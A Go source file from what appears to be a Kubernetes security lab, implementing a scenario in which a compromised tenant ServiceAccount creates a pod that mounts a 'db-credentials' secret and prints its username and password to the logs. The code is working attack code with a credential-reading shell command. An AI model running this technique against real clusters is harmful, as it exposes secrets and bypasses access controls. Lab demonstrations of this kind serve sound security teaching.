package scenarios

import (
	"context"
	"fmt"
	"strings"
	"time"

	"k8s-security-lab/internal/cluster"

	corev1 "k8s.io/api/core/v1"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func PodCreateAttack() error {
	fmt.Println("[*] Starting pod creation abuse scenario")

	namespace := "tenant-a"
	serviceAccountName := "tenant-sa"
	podName := "pod-create-attacker"

	adminClient, err := cluster.GetClient()
	if err != nil {
		return err
	}

	compromisedClient, err := cluster.GetServiceAccountClient(namespace, serviceAccountName)
	if err != nil {
		return err
	}

	err = adminClient.CoreV1().
		Pods(namespace).
		Delete(context.Background(), podName, metav1.DeleteOptions{})
	if err != nil && !apierrors.IsNotFound(err) {
		return err
	}

	fmt.Printf("[*] Using compromised %s/%s identity to create a pod\n", namespace, serviceAccountName)

	pod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      podName,
			Namespace: namespace,
		},
		Spec: corev1.PodSpec{
			RestartPolicy: corev1.RestartPolicyNever,
			Containers: []corev1.Container{
				{
					Name:  "loot",
					Image: "alpine",
					Command: []string{
						"/bin/sh",
						"-c",
						"echo username=$(cat /loot/username); echo password=$(cat /loot/password)",
					},
					VolumeMounts: []corev1.VolumeMount{
						{
							Name:      "db-credentials",
							MountPath: "/loot",
							ReadOnly:  true,
						},
					},
				},
			},
			Volumes: []corev1.Volume{
				{
					Name: "db-credentials",
					VolumeSource: corev1.VolumeSource{
						Secret: &corev1.SecretVolumeSource{
							SecretName: "db-credentials",
						},
					},
				},
			},
		},
	}

	_, err = compromisedClient.CoreV1().
		Pods(namespace).
		Create(context.Background(), pod, metav1.CreateOptions{})
	if err != nil {
		fmt.Println("[!] Pod creation failed")
		fmt.Println("\nEvidence:")
		fmt.Println(err)
		return err
	}

	fmt.Println("[+] Pod created with compromised ServiceAccount credentials")
	fmt.Println("[*] Waiting for the exfiltration pod to emit logs")

	_, err = waitForPodCompletion(adminClient, namespace, podName, 45*time.Second)
	if err != nil {
		return err
	}

	logs, err := getPodLogs(adminClient, namespace, podName)
	if err != nil {
		return err
	}

	fmt.Println("\nEvidence:")
	fmt.Println(strings.TrimSpace(logs))

	fmt.Println("\nImpact:")
	fmt.Println("- Attacker can execute arbitrary containers inside the namespace")
	fmt.Println("- Pod creation can expose mounted secrets without direct secrets/get access")
	fmt.Println("- Workload creation is effectively code execution in the tenant")

	return nil
}
